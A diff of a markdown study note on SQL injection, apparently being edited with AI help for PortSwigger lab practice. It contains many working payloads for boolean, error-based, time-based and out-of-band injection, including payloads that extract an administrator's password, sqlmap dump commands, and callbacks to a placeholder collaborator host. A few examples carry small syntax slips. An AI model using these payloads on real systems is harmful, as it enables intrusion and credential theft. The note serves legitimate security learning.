@@ -1,15 +1,10 @@
 ---
 created: 2026-04-18
 sticker: lucide//syringe
+tags:
+  - web_hacking
+  - SQL
 ---
-
-
-okay, now the last proofread
-but also please add more useful commands, cheat sheets, especially blind SQLi
-such as from here
-https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-and other labs
-could you please make sure the article sounds uniformly and grammatically correct? point to places where the style noticeably differs (point &like this&).
 
 ## Introduction: the concept of SQL injection
 
@@ -107,7 +102,6 @@ If user input is directly inserted into a query, an attacker can often **break o
 > - The injected `'` closes the string, and `--` comments out the `hidden = 0` condition.
 >
 > The application now returns **all** detective books, including those meant to be hidden.
-
 ### Potential impact
 
 The impact of a successful SQL injection depends on the database privileges, application design, and DBMS (Database Management System) feature, but often escalates into full application or system compromise. Potential consequences:
@@ -213,13 +207,11 @@ The impact of a successful SQL injection depends on the database privileges, app
 	- Send the original request multiple times and record the **response content**, **response length**, **status code**, and **response time**.
 
 2. **Confirm input is actually used**
-	- Modify parameters slightly: change values (`1` -> `2`, `abc` -> `xyz`) and observe if the response changes. 
-	- If you see no changes, input may either nor reach backend or be stored for later use (-> [[#Second-order SQL injection]]).
-
----
+	- Modify parameter value slightly (`1` -> `2`, `abc` -> `xyz`) and observe whether the response changes. 
+	- If nothing changes regardless of what you submit, the input may not reach the backend, or the application ignores it. Another possibility is that input is stored for later use (→ [[#Second-Order SQL Injection]]).
 
 3. **Break SQL syntax**
-	- Attempt to **escape the data context** by injecting quote characters and parentheses (e.g., `'`, `"` , `` ` ``, etc).
+	- Attempt to **escape the data context** by injecting delimiter characters, such as quotes characters and parentheses (e.g., `'`, `"` , `` ` ``, etc). The goal is to generate a syntax error.
 
 	```
 	'
@@ -228,44 +220,49 @@ The impact of a successful SQL injection depends on the database privileges, app
 	')
 	")
 	`)
+	''
 	```
 	
 	- Look for:
-		- SQL error messages
-		- HTTP `500 Server Error` responses
-		- Broken page structure 
-		- Missing content
-	- Any of the above strongly suggest unsanitized SQL execution.
+		- SQL error messages (see [[#Error-based SQLi]])
+		- HTTP `500 Internal Server Error` responses
+		- Broken page structure or missing content
+		- Truncated response
+	- Any of these strongly suggest that your input is reaching a SQL parser without sanitization.
 
 4. **Identify the injection context**
-	- Determine whether you input is treated as a string or number, and whether it sits inside parentheses.
+	- Determine *where* in the query your input lands, whether it is treated as a string or number, whether it is wrapped in parentheses, etc.
 
 		```SQL
-		-- string context
+		-- string context (input is wrapped in single quotes)
 		' AND '1'='1
 		
-		-- numeric context
+		-- numeric context (no quotes)
 		' AND 1=1
 		
-		-- string context in parentheses
-		') AND ('1'='1)
+		-- string inside parentheses
+		') AND ('1'='1
+		
+		-- double quotes
+		" AND "1"="1
 		```
-		- Also consider:
-			- Inside quotes?
-			- Inside parentheses?
-			- Used in `ORDER BY` / `LIMIT`?
+
+>[!tip] Error messages may reveal the query structure. For example, `unterminated quoted string` means a string context.
 
 5. **Test boolean logic (primary detection signal)**
-	- Inject conditions that evaluate to `true` and `false`, and compare the responses.
+	- Inject conditions that evaluate deterministically to `true` and `false` and compare responses.
 
 		```SQL
-		' AND 1=1-- -    -- true: normal response
-		' AND 1=2-- -    -- false: different response
+		' AND 1=1-- -      # true: normal response
+		' OR 1=1-- -       # always true
+		' AND 'a'='a'-- -
 		
-		' OR 1=1-- -     -- always true
-		' OR 1=2-- -     -- depends on underlying data
+		' AND 1=2-- -      # false: different response
+		' AND 'a'='b'-- -
 		```
+	
 	- If the responses differ consistently, SQL injection is confirmed.
+	- The difference does not have to be dramatic — even a single missing element, a slightly different byte count, or a changed database-driven value is sufficient.
 
 6. **Append comments**
 	- Attempt to cut off the remainder of the query.
@@ -282,8 +279,18 @@ The impact of a successful SQL injection depends on the database privileges, app
 		- Changed behavior
 	- This confirms you can **control query structure**, not just values.
 
+>[!note]+ Comment syntax by DBMS
+> 
+> | DBMS           | Inline comment                             | Block comment   |
+> | -------------- | ------------------------------------------ | --------------- |
+> | **MySQL**      | `-- comment` (space needed)<br>`# comment` | `/* comment */` |
+> | **MSSQL**      | `--comment`                                | `/* comment */` |
+> | **PostgreSQL** | `--comment`                                | `/* comment */` |
+> | **Oracle**     | `--comment`                                | `/* comment */` |
+> | **SQLite**     | `--comment`                                | `/* comment */` |
+ 
 7. **Probe for `UNION`-based SQLi**
-	- Test whether you can append additional `SELECT` statements:
+	- Test whether you can append additional `SELECT` statements to the existing query.
 
 		```SQL
 		' UNION SELECT NULL--
@@ -298,10 +305,12 @@ The impact of a successful SQL injection depends on the database privileges, app
 	- See [[#Union-based SQLi]].
 
 8. **Force errors**
-	- Induce the database to throw errors:
+	- Trigger type conversion or arithmetic errors.
 		```SQL
 		' AND 1/0--
 		' AND CAST((SELECT 1) AS int)--
+		' AND 1=CONVERT(int, @@version)-- -              # MSSQL
+		' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -  # MySQL
 		```
 	- Look for:
 		- Detailed database errors
@@ -311,52 +320,62 @@ The impact of a successful SQL injection depends on the database privileges, app
 		- DBMS type
 		- Query structure
 		- Table/column names
+		- Actual data
 	- See [[#Error-based SQLi]].
 
 9. **Test time-based techniques**
-	- If no visible difference exists, attempt to induce a delay:
+
+	- When there is no visible response difference and no error output, use conditional delays.
 		```SQL
-		' AND SLEEP(5)-- -            -- MySQL
-		' AND pg_sleep(5)-- -         -- PostgreSQL (via subquery)
-		'; WAITFOR DELAY '0:0:5'-- -  -- MSSQL
+		' AND SLEEP(5)-- -            # MySQL
+		' AND pg_sleep(5)-- -         # PostgreSQL (via subquery)
+		'; WAITFOR DELAY '0:0:5'-- -  # MSSQL
+		' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)-- - # Oracle
 		```
+	
 	- Observe response delay (~5 seconds)
-	- Then confirm with a condition:
+	- Then confirm the signal is condition-dependent:
+
 		```SQL
-		' AND IF(1=1, SLEEP(5), 0)-- - -- delay: true
-		' AND IF(1=2, SLEEP(5), 0)-- - -- no delay: false
+		' AND IF(1=1, SLEEP(5), 0)-- - # delay: true condition
+		' AND IF(1=2, SLEEP(5), 0)-- - # no delay: false condition
 		```
-	- A delay on the true condition and no delay on the false condition confirms blind time-based injection.
+	
+	- A delay that fires only on the true condition and not on the false condition is a confirmed time-based injection.
 	- See [[#Time-based blind SQLi]].
 
 10. **Test out-of-band (OOB) interactions**
-	- If none of the above produce a detectable signal, test for out-of-band DNS interaction (e.g., using Burp Collaborator or [`interactsh`](https://github.com/projectdiscovery/interactsh)).
-	- If you see no errors (in-band error-based), content differences (blind boolean-based), or timing differences (blind time-based), test for out-of-band (OOB) techniques:
+	- If you see no errors (in-band error-based), content differences (blind boolean-based), or timing differences (blind time-based), test for out-of-band (OOB) techniques.
+	- Use Burp Collaborator or [`interactsh`](https://github.com/projectdiscovery/interactsh) to detect the callback.
+
 		```SQL
-		-- MSSQL
+		# MSSQL
 		'; EXEC master..xp_dirtree '//your-collaborator-id.burpcollaborator.net/x'-- -
 		
-		-- MySQL (Windows, requires FILE privilege)
+		# MySQL (Windows, requires FILE privilege)
 		' UNION SELECT LOAD_FILE('\\\\your-collaborator-id.burpcollaborator.net\\x')-- -
 		
-		-- Oracle
+		# Oracle
 		' AND UTL_HTTP.REQUEST('http://your-collaborator-id.burpcollaborator.net') IS NOT NULL-- -	
 		```
+	
 	- See [[#Out-of-band SQLi]].
 
-10. **Attempt filter bypasses**
+11. **Attempt filter bypass**
+
 	- If payloads fail or behave inconsistently, try evasion techniques:
+
 		```SQL
-		-- encoding
+		# encoding
 		%27 OR 1=1-- -
 		
-		-- case variation
+		# case variation
 		' UnIoN SeLeCt NULL-- -
 		
-		-- comment substitution for spaces
+		# comment substitution for spaces
 		'/**/OR/**/1=1-- -
 		
-		-- alternative operators
+		# alternative operators
 		' OR 1 LIKE 1-- -
 		' OR 1 BETWEEN 1 AND 1-- -
 		```
@@ -374,141 +393,21 @@ The impact of a successful SQL injection depends on the database privileges, app
 >- [[🛠️ SQL injection labs#4. Lab SQL injection attack, querying the database type and version on MySQL and Microsoft|4. Lab SQL injection attack, querying the database type and version on MySQL and Microsoft]]
 >- [[🛠️ SQL injection labs#5. Lab SQL injection attack, listing the database contents on non-Oracle databases|5. Lab SQL injection attack, listing the database contents on non-Oracle databases]]
 >- [[🛠️ SQL injection labs#6. Lab SQL injection attack, listing the database contents on Oracle|6. Lab SQL injection attack, listing the database contents on Oracle]]
-### Injection in different parts of the query
 
-SQL injection can occur in **any part of a SQL query** that incorporates user input. The objective is always the same: **break out of the data context into the code context** and manipulate the query's structure.
-
-Although most SQL injection vulnerabilities occur in the `WHERE` clause of a `SELECT` statement, vulnerable sinks exist throughout the query:
-- `WHERE` clause -> filtering conditions (most common)
-- `ORDER BY` clause -> sorting logic
-- `LIMIT` / `OFFSET` -> pagination
-- `INSERT` statements -> inserted values
-- `UPDATE` statements -> in `SET` values or `WHERE` clause
-- `SELECT` statements -> in column or table names
-- `GROUP BY`, `HAVING` -> aggregation logic
-- External inputs -> JSON, cookies, headers
-
-#### `WHERE`
-
-- The classic injection point, where the user input is embedded into filtering logic.
-
-- Original query:
-
-```SQL
-SELECT title, author FROM books WHERE genre = 'mystery';
-```
-
-- Boolean-based injection:
-	
-	```SQL
-	' AND (SELECT SUBSTR(password,1,1)='a' 
-	FROM users WHERE username='administrator')--
-	```
-	- `true` → normal results
-	- `false` → empty or altered results
-
-- Error-based:
-
-#### `ORDER BY`
-
-
->[!note]+ `ORDER` syntax
-> ```SQL
-> SELECT column1, column2, ...  
-> FROM table_name  
-> ORDER BY column1, column2, ... ASC|DESC;
-> ```
-
-If the sort column is taken from user input without proper validation, an attacker can inject SQL into the `ORDER BY` clause. 
-
-- SQLi in `ORDER BY` is a bit different from the usual `WHERE`-based injections because you’re not injecting a condition directly — you’re influencing **how results are sorted**. 
-- So the trick is to turn sorting into a side channel (different order, errors, or delays).
----
-- **Boolean-based** — you conditionally choose **which column to sort by** depending on a boolean:
-
-	```SQL
-	ORDER BY
-	  CASE
-	    WHEN (SUBSTR(password,1,1)='a') THEN username
-	    ELSE id
-	  END
-	```
-
-	- Injection:
-
-	```SQL
-	1, (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN username ELSE id END FROM users LIMIT 1)
-	```
-
-	- If condition is `true` -> sorted by `username`.
-	- If false -> sorted by `id`.
-	- Different results -> different row order -> different first item.
-
-- **Error-based** — trigger an error **only when the condition is true**, using the `ORDER BY` expression:
-	
-	```SQL
-	ORDER BY
-	  CASE
-	    WHEN (SUBSTR(password,1,1)='a') THEN 1/0
-	    ELSE 1
-	  END
-	```
-	
-	- Injection:
-	
-	```SQL
-	1, (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END)
-	```
-
-	- `true` -> error (`500`).
-	- `false` -> normal response.
-
-
-- **Time-based** — introduce a delay inside the `ORDER BY` expression:
-
-	```SQL
-	ORDER BY
-	  CASE
-	    WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(5)
-	    ELSE 1
-	  END
-	```
-	
-	- Injection:
-	
-	```SQL
-	1, (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(5) ELSE 1 END)
-	```
-	
-	- `true` → delayed response (~5 seconds).
-	- `false` → normal response.
-
-
->[!warning]+ You usually can't use plain boolean logic
+>[!tip]+ SQL injection can occur in **any part of a SQL query** that incorporates user input. 
 > 
-> This usually **fails**:
+> The objective is always the same: **break out of the data context into the code context** and manipulate the query's structure.
 > 
-> ```SQL
-> ORDER BY (SELECT SUBSTR(password,1,1)='a')
-> ```
-> 
-> Because `ORDER BY` expects a column or a sortable expression.
+> Although most SQL injection vulnerabilities occur in the `WHERE` clause of a `SELECT` statement, vulnerable sinks exist throughout the query:
+> - `WHERE` clause -> filtering conditions (most common)
+> - `ORDER BY` clause -> sorting logic
+> - `LIMIT` / `OFFSET` -> pagination
+> - `INSERT` statements -> inserted values
+> - `UPDATE` statements -> in `SET` values or `WHERE` clause
+> - `SELECT` statements -> in column or table names
+> - `GROUP BY`, `HAVING` -> aggregation logic
+> - External inputs -> JSON, cookies, headers
 
->[!warning] `CASE` branches must be compatible: numbers with numbers, strings with strings.
->This will fail:
->```SQL
->THEN username ELSE 1   -- type mismatch
->```
-
->[!warning] **You can not place a `UNION` operation after an `ORDER BY` clause within a single `SELECT` statement.**
-
->[!note] You can specify multiple columns to sort by. 
-
-```SQL
-SELECT name, author FROM books WHERE genre = 'detective' ORDER BY (SELECT 1 FROM (SELECT(SLEEP(5)) FROM information_schema.tables WHERE table_schema = 'webapp_db') WHERE 1=1--
-```
-
-#### `LIMIT`
 ## Types of SQL injection
 
 SQL injections can be divided into three main types based on how and where you retrieve or infer the results of the queries:
@@ -603,16 +502,50 @@ id=1"
 - **Type casting** — force the database to cast incompatible types (e.g., string to integer):
 
 ```SQL
--- - MySQL/Postgres
-id=' AND 1=CAST((SELECT database()) AS int)-- -
+# MySQL / Postgres
+
+' AND 1=CAST((SELECT version()) AS int)-- -
+' AND 1=CAST((SELECT database()) AS unsigned)-- -
+' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -
+' AND CAST((SELECT password FROM users WHERE username='admin' LIMIT 1) AS int)-- -
 ```
 
 ```SQL
--- MSSQL
-id=1' AND 1=CONVERT(int, (SELECT @@version))--
+# MSSQL
+
+' AND 1=CONVERT(int, (SELECT @@version))--
+
+# EXTRACTVALUE expects (xml_document, xpath_expression)
+# if XPath is invalid (e.g., strats with ~), error contains the XPath value
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
+# Error: XPATH syntax error: '~8.0.32'
+
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin' LIMIT 1)))-- -
+# Error: XPATH syntax error: '~supersecretpassword'
+
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)-- -
+
+' AND 1=(SELECT 1 FROM (SELECT CAST(version() AS int)) x)-- -
 ```
 
->[!tip]+ These errors often include the **actual query result** inside the error message.
+>[!note] `0x7e` is the hex encoding of `~`; it is used to ensure the XPath expression starts with a non-XPath character and guarantees the error fires.
+
+```SQL
+# Oracle
+
+' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))-- -
+```
+
+>[!important]+ Type casting error messages often include the **actual query result**.
+> ```
+> ERROR: invalid input syntax for type integer: "PostgreSQL 14.5"
+> ```
+
+> [!tip] Error-based extraction is subject to output length limits. Most engines truncate error messages after a certain number of characters. If the value you want is long, use `SUBSTRING()` to extract it in chunks:
+> 
+> ```sql
+> ' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1),1,31)))-- -
+> ```
 
 - **Arithmetic errors (e.g., division by zero)**:
 
@@ -920,50 +853,49 @@ Blind SQLi is commonly divided into:
 - You inject **conditional expressions**.
 - The application behaves differently depending on the result. 
 - You map `true` to one response, and `false` to another, and then use this information to infer the actual data using conditional queries. 
-#### 2. Establish a baseline
+#### 1. Establish a reliable signal
 
-Before extracting data, confirm you can reliably distinguish `true` and `false`.
+Before extracting anything, confirm you can consistently differentiate `true` from `false`.
 
-- Always-`true` payloads:
+- Always `true`:
 
-```SQL
-' OR 1=1-- -
-' OR 'a'='a'-- -
-' AND '1'='1
+```sql
+' AND 1=1-- -
+' OR 'x'='x'-- -
+' AND (SELECT 1)=1-- -
 ```
 
-- Expressions that always return `false`:
+- Always `false`:
 
 ```SQL
 ' AND 1=2-- -
-' AND 'a'='b'-- -
-' AND '1'='2
+' OR 'x'='y'-- -
+' AND (SELECT 1)=2--
 ```
 
-Observe differences such as:
-- Content appearing/disappearing
-- HTTP headers
-- Status codes
-- Presence or absence of content or specific elements
-- Page length
-- Specific strings or UI elements
+- Run each payload multiple times. The `true` payload must consistently produce the one response, and the `false` payload must consistently produce a different response.
+- Differences may be:
+	- Content appearing/disappearing
+	- HTTP headers
+	- Status codes
+	- Presence or absence of content or specific elements
+	- Page length
+	- Specific strings or UI elements
 
 >The goal is to find a **stable signal** you can trust during automation.
 
-You establish a *dependency* between the query results and application behavior, which can be used to determine the results of other conditions you inject later.
+- You're establishing a *dependency* between the query results and application behavior, which can be used to determine the results of other conditions you inject later.
 #### 2. Infer data 
-
-``instruction for AI: add different ways to do the same, possibly for different DBMSs``
 
 Once you have a signal, you can extract arbitrary data.
 
-- Verify that the condition is true, confirming that there is a table called `users`:
+- Confirm a table exists:
 
 ```SQL
 ' AND (SELECT 'a' FROM users LIMIT 1)='a
 ```
 
-- Verify that the condition is true, confirming that there is a user called `administrator`:
+- Confirm there is a user with the username `administrator`:
 
 ```SQL
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
@@ -971,13 +903,16 @@ Once you have a signal, you can extract arbitrary data.
 
 - Determine password length:
 
-```SQL
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
+```sql
+' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x'-- -   # true
+' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>20)='x'-- -   # false
+' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)=20)='x'-- -   # true
 ```
 
 ```SQL
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<20)='a
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a      # true
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<20)='a      # false
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a      # true
 ```
 
 >[!tip]+ Two ways to determine string length
@@ -998,25 +933,32 @@ Once you have a signal, you can extract arbitrary data.
 > ' AND database() LIKE '_____'-- - # true
 > ```
 
-- Password characters:
+- Extract password characters:
 
 ```SQL
+# is the first character of the administrator's password 'a'?
+
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
-```
-
-```SQL
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a
 ```
 
->[!note] See [[🛠️ SQL injection cheat sheet#Length|Length]], [[🛠️ SQL injection cheat sheet#Pattern matching|Pattern matching]], and [[🛠️ SQL injection cheat sheet#Substrings|Substrings]].
-
 ![[alphabet.svg]]
 
->[!tip] Optimize with **binary search**.
+>[!tip] Optimize character extraction with **binary search**.
 
 >[!important]+ Binary search
 >The **binary search algorithm** is the most efficient way to infer data when you only have `true` and `false`. It works as follows:
 >1. Divide the search space (e.g., alphabet) into two halves by **finding the middle index `mid`**.
+> 
+> 2. Ask a **yes/no question** that determines which half contains the answer.
+>     - If the result is `true`, continue searching in one half.
+>     - If the result is `false`, continue searching in the other half.
+> 3. Repeat the process on the remaining half:
+>     - Recalculate the new middle index `mid`.
+>     - Eliminate half of the remaining possibilities each time.
+> 4. Stop when the target value is found.
+> 
+> Because the search space is cut in half every iteration, binary search runs in logarithmic time: $$ O(\log_2 n) $$
 
 >[!example]-
 > ```SQL
@@ -1030,6 +972,7 @@ Once you have a signal, you can extract arbitrary data.
 > ' AND SUBSTRING(database(),1,1)='v'--  # is 'v' — false
 > ' AND SUBSTRING(database(),1,1)='u'--  # is 'u' — true
 > ```
+> 
 
 - Table name:
 
@@ -1045,10 +988,28 @@ Once you have a signal, you can extract arbitrary data.
 		WHERE username='admin'),1,1)='a'--
 ```
 
-Repeat per character.
+Repeat per-character.
+
+>[!tip]+ `SUBSTRING()`/`SUBSTR()` syntax across DBMSs
+> 
+> | DBMS           | Syntax                                      | Example                                       |
+> | -------------- | ------------------------------------------- | --------------------------------------------- |
+> | **MySQL**      | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
+> | **MSSQL**      | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
+> | **PostgreSQL** | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
+> | **Oracle**     | `SUBSTR(<string>, <position>, <length>)`    | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
+> | **SQLite**     | `SUBSTR(<string>, <position>, <length>)`    | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
 #### 3. Automation
 
-Blind SQLi is rarely done manually in practice.
+Manual extraction is impractical beyond proof-of-concept. Use `sqlmap` for automated extraction, or script it with `ffuf`/`curl`.
+
+- `sqlmap`:
+
+```bash
+sqlmap -u "https://target.com/filter?category=Gifts" --dbs --batch
+sqlmap -u "https://target.com/filter?category=Gifts" -D webapp_db --tables --batch
+sqlmap -u "https://target.com/filter?category=Gifts" -D webapp_db -T users --dump --batch
+```
 
 - `ffuf`:
 
@@ -1057,33 +1018,19 @@ ffuf -u https://target.com \
 -H "Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='FUZZ-- -" \
 -w chars.txt
 ```
-
-This way is rough and inefficient. 
-
-- Use wordlists for word guessing.
-- Length + first character -> filter wordlist
-
-- Binary search
-- Short-circuit conditions
-- Filtering (e.g., `[a-f0-9]` for hashes)
 ### Turning blind into in-band
 
-Sometimes you can force the database to **leak data via errors**:
+- Sometimes you can force the database to **leak data via errors**:
 
 ```SQL
 ' AND CAST((SELECT username FROM users LIMIT 1) AS int)-- -
 ```
-
-- Result:
-
 ```bash
 ERROR: invalid input syntax for type integer: "administrator"
 ```
 
 This effectively upgrades blind SQLi into **error-based SQLi**.
 
->[!tip] 
->It might be possible to turn blind SQL injection into an in-band one by inducing the database to output the results of the query inside a visible error message.
 
 For example, you can use the `CAST()` function (used to convert one data type onto another) to achieve this:
 
@@ -1092,38 +1039,34 @@ CAST((SELECT string_column_name FROM table_name) AS int)
 ```
 
 >[!example]+ Example
-> Say, you inject the following:
+>0 Inject:
 > 
 > ```SQL
-> AND CAST((SELECT username FROM users LIMIT 1) AS int)-- - 
+>' AND CAST((SELECT username FROM users LIMIT 1) AS int)-- - 
 > ```
 > 
-> The application returns an error:
+>- The application returns an error:
 > 
 > ```
 > ERROR: invalid input syntax for type integer: "administrator"
 > ```
 > 
-> To retrieve the password:
+> - Retrieve the password:
 > 
 > ```SQL
 > AND CAST((SELECT password FROM users WHERE username='administrator') AS int)-- - 
 > ```
 > 
-> And you get the data inside an error message:
+> - Extract the data from an error message:
 > 
 > ```SQL
 > ERROR: invalid input syntax for type integer: "passwd123"
 > ```
 #### Error-based blind SQLi
 
-	``instruction for AI: explain based on solution: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors``
+>**Error-based blind SQL injection** is a variation of a boolean-based blind SQLi where the signal is **error vs. no error**, rather than a content difference.
 
->**Error-based blind SQL injection** where the signal is **error vs. no error**, rather than content differences.
-
-- You deliberately trigger errors **only when a condition is true**.
-- The actual error message content **does not matter**.
-- The **presence or absence of errors** alone is an indicator.
+- The key construct is a conditional expressions that trigger a deliberate error (such as division by zero) only when a condition is true. The **presence or absence of errors** alone serves as an indicator.
 
 - To trigger conditional errors, you can use the [`CASE`](https://www.w3schools.com/sql/sql_case.asp) keyword: 
 
